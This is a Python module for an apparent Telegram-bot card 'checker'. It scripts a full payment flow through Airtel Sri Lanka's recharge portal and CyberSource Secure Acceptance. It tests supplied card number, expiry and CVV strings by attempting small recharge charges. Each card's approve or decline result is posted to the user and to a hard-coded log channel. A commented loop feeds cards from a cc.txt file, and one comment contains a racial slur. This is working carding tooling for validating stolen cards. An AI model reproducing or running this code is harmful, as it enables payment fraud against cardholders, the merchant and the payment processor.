from bs4 import BeautifulSoup
import requests
import json
import re
import json
import time
from .encrypt import encrypt_data, gen_public_key
import random


def checking_function(credit_number, bot, message, update_cooldown):
  try:
    start = time.time()
    rem = credit_number
    # Check if '|' exists in the message
    extracted_parts = rem.split('|')
    # Check if the input matches the expected format
    cc = extracted_parts[0]
    mes = extracted_parts[1]
    ano = extracted_parts[2]
    if len(ano) == 2:
      ano = '20' + ano
    cvv = extracted_parts[3]
    # Define the URL
    url_paymentInit = 'https://recharge.airtel.lk/recharge/scapp/payment/paymentInit'
    session = requests.Session()
    # Define headers as provided
    headers_paymentInit = {
        'Host': 'recharge.airtel.lk',
        'Content-Length': '77',
        'Cache-Control': 'max-age=0',
        'Sec-Ch-Ua': '"Chromium";v="119", "Not?A_Brand";v="24"',
        'Sec-Ch-Ua-Mobile': '?0',
        'Sec-Ch-Ua-Platform': '"Windows"',
        'Upgrade-Insecure-Requests': '1',
        'Origin': 'https://recharge.airtel.lk',
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent':
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36',
        'Accept':
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Dest': 'document',
        'Referer': 'https://recharge.airtel.lk/',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'Priority': 'u=0, i',
        'Connection': 'close'
    }
    # List of numbers
    numbers = [
        758400450, 754578455, 757854196, 755421366, 757514524, 751245387
    ]
    ##bot.edit_message_text(chat_id=sent_message.chat.id,message_id=sent_message.message_id,text="Please wait nigg! Checking your card...")

    # Select a random number from the list
    random_number = random.choice(numbers)

    # Print the randomly selected number
    #print(random_number)
    # Define your detailed payload data
    payload_paymentInit = {
        'paymentNumber': random_number,
        'paymentAmount': '100',
        'blackout': 'false',
        'ipg_type': '',
        'cux_type': '1'
    }

    # Send the POST request
    response_paymentInit = session.post(url_paymentInit,
                                        headers=headers_paymentInit,
                                        data=payload_paymentInit)

    html_content = response_paymentInit.text
    #print(html_content)
    # Parse the HTML content
    pattern = r'<input type="hidden" id="(.*?)" name=".*?" value="(.*?)"\/>'

    # Find all matches using the pattern
    matches = re.findall(pattern, html_content)

    # Extract values into a dictionary
    data = {field_id: field_value for field_id, field_value in matches}

    # Convert to JSON
    parsed_json_data = json.dumps(data, indent=2)
    json_data = json.loads(parsed_json_data)

    #print(json_data)

    access_key = json_data["access_key"]
    profile_id = json_data["profile_id"]
    transaction_uuid = json_data["transaction_uuid"]
    signed_date_time = json_data["signed_date_time"]
    reference_number = json_data["reference_number"]
    signature = json_data["signature"]

    # /////////////////////////// 2 REQ //////////////////////////////////////////

    url_pay = 'https://secureacceptance.cybersource.com/pay'

    headers_pay = {
        'Content-Length': '877',
        'Cache-Control': 'max-age=0',
        'Sec-Ch-Ua': '"Chromium";v="119", "Not?A_Brand";v="24"',
        'Sec-Ch-Ua-Mobile': '?0',
        'Sec-Ch-Ua-Platform': '"Windows"',
        'Upgrade-Insecure-Requests': '1',
        'Origin': 'https://recharge.airtel.lk',
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent':
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36',
        'Accept':
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Sec-Fetch-Site': 'cross-site',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Dest': 'document',
        'Referer': 'https://recharge.airtel.lk/',
        'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'Priority': 'u=0, i',
        'Connection': 'close'
    }

    payload_pay = {
        'access_key': access_key,
        'profile_id': profile_id,
        'transaction_uuid': transaction_uuid,
        'signed_field_names':
        'access_key,profile_id,transaction_uuid,signed_field_names,unsigned_field_names,signed_date_time,locale,transaction_type,reference_number,amount,currency,bill_to_address_city,bill_to_address_line1,bill_to_address_country,bill_to_address_state,bill_to_email,bill_to_forename,bill_to_surname',
        'unsigned_field_names': '',
        'signed_date_time': signed_date_time,
        'locale': 'en',
        'transaction_type': 'sale',
        'reference_number': reference_number,
        'amount': '100.00',
        'currency': 'LKR',
        'bill_to_address_city': 'colombo',
        'bill_to_address_line1': 'colombo',
        'bill_to_address_state': '',
        'bill_to_address_country': 'LK',
        'bill_to_email': 'rechgportal@alert.com',
        'bill_to_forename': 'Airtel',
        'bill_to_surname': 'Airtel',
        'signature': signature
    }

    response_for_2req = session.post(url_pay,
                                     headers=headers_pay,
                                     data=payload_pay,
                                     allow_redirects=True)

    initial_cookies_dict = {}
    bot.edit_message_text(chat_id=message.chat.id,
                          message_id=message.message_id,
                          text="Authenticating..")
    initial_cookies = response_for_2req.history[0].cookies
    for cookie in initial_cookies:
      initial_cookies_dict[cookie.name] = cookie.value
    #bot.edit_message_text(chat_id=sent_message.chat.id,message_id=sent_message.message_id,text="Step 1 - 3")
    # Convert the dictionary to JSON format
    initial_cookies_json = json.dumps(initial_cookies_dict)

    parsed_json = json.loads(initial_cookies_json)

    # Access specific values to create variables
    JSESSIONID = parsed_json.get('JSESSIONID')
    cfruid = parsed_json.get('__cfruid')

    cookie = f"JSESSIONID={JSESSIONID}; __cfruid={cfruid}"
    #print(cookie)

    html_content = response_for_2req.text

    pattern = r'<input type="hidden" id="jwk" value=\'(.*?)\''
    matches = re.search(pattern, html_content)
    if matches:
      jwk_value = matches.group(1)
    json_response = json.loads(jwk_value)

    # token for /payment_update
    auth_pattern = r'<input type="hidden" name="authenticity_token" value="(.*?)" autocomplete="off" />'
    auth_matches = re.search(auth_pattern, html_content)
    if auth_matches:
      authenticity_token = auth_matches.group(1)
    ###print('authenticity_token ', authenticity_token)

    # token for /payer_authentication/hybrid
    payer_auth_pattern = r'<input type="hidden" name="authenticity_token" value="(.*?)" />'
    payer_auth_matches = re.search(payer_auth_pattern, html_content)
    if payer_auth_matches:
      prayer_authenticity_token = payer_auth_matches.group(1)
    #print('prayer_authenticity_token ', prayer_authenticity_token)

    public_key = gen_public_key(json_response)
    card_number = encrypt_data(public_key, cc)
    cvv_number = encrypt_data(public_key, cvv)

    url_payment_update = "https://secureacceptance.cybersource.com/payment_update"

    # Define headers for url_payment_update without cookies

    headers_payment_update = {
        'Host': 'secureacceptance.cybersource.com',
        'Cookie': cookie,
        'Content-Length': '1016',
        'Cache-Control': 'max-age=0',
        'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120"',
        'Sec-Ch-Ua-Mobile': '?0',
        'Sec-Ch-Ua-Platform': '"Windows"',
        'Upgrade-Insecure-Requests': '1',
        'Origin': 'https://secureacceptance.cybersource.com',
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent':
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36',
        'Accept':
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-User': '?1',
        'Sec-Fetch-Dest': 'document',
        'Referer': 'https://secureacceptance.cybersource.com/payment',
        'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'Priority': 'u=0, i'
    }

    if cc.startswith('4'):
      card_type = "001"
      #print('VISA')
    elif cc.startswith('5'):
      card_type = "002"
      #print('MASTERCARD')
    else:
      return '#ERR Unsuported Card Type'

    payload_payment_update = {
        'utf8': '\u2713',
        'authenticity_token': authenticity_token,
        'payment_method': 'card',
        'card_type': card_type,
        'card_number': cc,
        '__e.card_number': card_number,
        'card_expiry_month': mes,
        'card_expiry_year': ano,
        'card_cvn': cvv,
        '__e.card_cvn': cvv_number
    }
    #print(headers_payment_update)
    #print('payload_payment_update ', payload_payment_update)
    response_payment_update = session.post(url_payment_update,
                                           headers=headers_payment_update,
                                           data=payload_payment_update,
                                           allow_redirects=True)
    # print(response_payment_update.status_code, response_payment_update.text)

    re_matches = re.finditer(auth_pattern, response_payment_update.text)
    matches_list = list(
        re_matches)  # Convert the iterator to a list for easier access

    if len(matches_list) >= 2:  # Checking if there are at least two matches
      second_match = matches_list[1]  # Index 1 corresponds to the second match
      review_authenticity_token = second_match.group(1)
      #print('review_authenticity_token', review_authenticity_token)
    else:
      print("There's no second match for the pattern.")

    # REVIEW REQUESTS /////////////////////////////////////

    url_review = "https://secureacceptance.cybersource.com/review"

    headers_review = {
        'Host': 'secureacceptance.cybersource.com',
        'Cookie': cookie,
        'Content-Length': '169',
        'Cache-Control': 'max-age=0',
        'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120"',
        'Sec-Ch-Ua-Mobile': '?0',
        'Sec-Ch-Ua-Platform': '"Windows"',
        'Upgrade-Insecure-Requests': '1',
        'Origin': 'https://secureacceptance.cybersource.com',
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent':
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36',
        'Accept':
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-User': '?1',
        'Sec-Fetch-Dest': 'document',
        'Referer': 'https://secureacceptance.cybersource.com/review',
        'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'Priority': 'u=0, i'
    }

    payload_review = {
        'utf8': '%E2%9C%93',
        'authenticity_token': review_authenticity_token,
        'ccaRetryAction': '/review',
        'customer_utc_offset': '330'
    }

    response4 = session.post(url_review,
                             headers=headers_review,
                             data=payload_review,
                             allow_redirects=True)

    # Define the regex pattern to match the authenticityToken
    regex_pattern = r'window\.ccaOptions\s*=\s*{[^}]*"authenticityToken"\s*:\s*"([^"]*)'
    log_channel_id = -1002058416799
    # Search for the pattern in the HTML response
    a_matches = re.search(regex_pattern, response4.text)

    if a_matches:
      a_authenticity_token = a_matches.group(1)
      print(f"a_authenticity_token: {a_authenticity_token}")
    else:
      print("Authenticity token not found.")

    # Extract the options using a regular expression
    match6 = re.search(r"window.ccaOptions = ({.*});", response4.text)
    if match6:
      options_json = match6.group(1)
      options = json.loads(options_json)

      # Access the desired values
      referenceId = options.get("referenceId")
      authenticityToken = options.get("authenticityToken")

      #print("referenceId:", referenceId)
      #print("authenticityToken:", authenticityToken)
    else:
      print("ccaOptions not found in the HTML code.")

    url_auth = "https://secureacceptance.cybersource.com/payer_authentication/hybrid"

    headers_auth = {
        "Cookie": cookie,
        "Content-Length": "491",  # Adjust if necessary
        "Sec-Ch-Ua": "\"Chromium\";v=\"117\", \"Not;A=Brand\";v=\"8\"",
        "Sec-Ch-Ua-Platform": "\"Windows\"",
        "Sec-Ch-Ua-Mobile": "?0",
        "User-Agent":
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36",
        "Content-Type":
        "application/x-www-form-urlencoded",  # Adjust if applicable
        "Accept": "*/*",
        "Origin": "https://secureacceptance.cybersource.com",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer":
        "https://secureacceptance.cybersource.com/payer_authentication/hybrid?ccaAction=load",
        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8"
    }
    payload_auth = {
        "ccaAction": "check",
        "ccaSessionId": referenceId,
        "ccaClientSessionId": "1_d599089c-0693-4043-8a35-ca76389b4180",
        "ccaTiming": "7252",
        "authenticity_token": authenticityToken,
        "customer_browser_color_depth": "24",
        "customer_browser_language": "en-GB",
        "customer_browser_java_enabled": "false",
        "customer_browser_screen_height": "1200",
        "customer_browser_screen_width": "1920",
        "customer_browser_time_difference": "-330",
        "__inner_width": "929",
        "__inner_height": "1038"
    }

    response_auth = session.post(url_auth,
                                 headers=headers_auth,
                                 data=payload_auth)

    #print(response_auth.text)
    # Convert the JSON string to a Python dictionary
    response_data = json.loads(response_auth.text)
    result_auth = response_data
    if result_auth["result"] == "Authenticate":
      end = time.time()
      elapsed_time = end - start
      formated_time = "{:.2f}".format(elapsed_time)
      formatted_result = f"» Status - DECLINE\n» Card - {credit_number}\n» Gateway - Cybersource\n» Response - Need to Authenticate\n\n» Time - {formated_time} sec"
      bot.edit_message_text(chat_id=message.chat.id,
                            message_id=message.message_id,
                            text=formatted_result)
      bot.send_message(chat_id=log_channel_id, text=formatted_result)
      update_cooldown(message.from_user.id)
      return True

    # prayer authenication eke aulk eke client sesion id ek hoygnn one ethain eahatathmi hdnn thiyewnnw ok done byy viagen passe hambemu
    url_payer_authentication = 'https://secureacceptance.cybersource.com/payer_authentication/hybrid'

    headers_payer_authentication = {
        'Host': 'secureacceptance.cybersource.com',
        'Cookie': cookie,
        'Content-Length': '153',
        'Cache-Control': 'max-age=0',
        'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120"',
        'Sec-Ch-Ua-Mobile': '?0',
        'Sec-Ch-Ua-Platform': '"Windows"',
        'Upgrade-Insecure-Requests': '1',
        'Origin': 'https://secureacceptance.cybersource.com',
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent':
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36',
        'Accept':
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Dest': 'document',
        'Referer':
        'https://secureacceptance.cybersource.com/payer_authentication/hybrid?ccaAction=load',
        'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'Priority': 'u=0, i'
    }

    payload_payer_authentication = {
        'authenticity_token': a_authenticity_token,
        'ccaAction': 'completeEarly',
        'ccaErrorsHandled': '%5B%5D'
    }

    # Make a POST request with the defined headers and payload
    response5 = session.post(url_payer_authentication,
                             headers=headers_payer_authentication,
                             data=payload_payer_authentication)

    # Check the response status
    #print(response5.text)
    ##bot.edit_message_text(chat_id=sent_message.chat.id, message_id=sent_message.message_id, text="Step - 4 of 4")

    soup = BeautifulSoup(response5.text, 'html.parser')

    # Find the input element with name="message"
    message_input = soup.find('input', {'name': 'message'})
    message_decision = soup.find('input', {'name': 'decision'})

    # Extract the value attribute of the input element
    if message_input and message_decision:
      message_value = message_input.get('value')
      message_decision_value = message_decision.get('value')
      end = time.time()
      elapsed_time = end - start
      formated_time = "{:.2f}".format(elapsed_time)
      formatted_result = f"» Status - {message_decision_value}\n» Card - {credit_number}\n» Gateway - Cybersource\n» Response - {message_value}\n\n» Time - {formated_time} sec"
      bot.edit_message_text(chat_id=message.chat.id,
                            message_id=message.message_id,
                            text=formatted_result)
      bot.send_message(chat_id=log_channel_id, text=formatted_result)
      update_cooldown(message.from_user.id)
      return True
    else:
      return "Input element 'message' not found in the HTML content."

  except Exception as e:
    return f'#ERR{e}'


"""file_name = "cc.txt"  # Replace 'your_file.txt' with the actual file name

with open(file_name, 'r') as file:
  for line in file:
    card_number = line.strip()  # Read each line (card number) from the file
    result = print(checking_function(card_number))"""
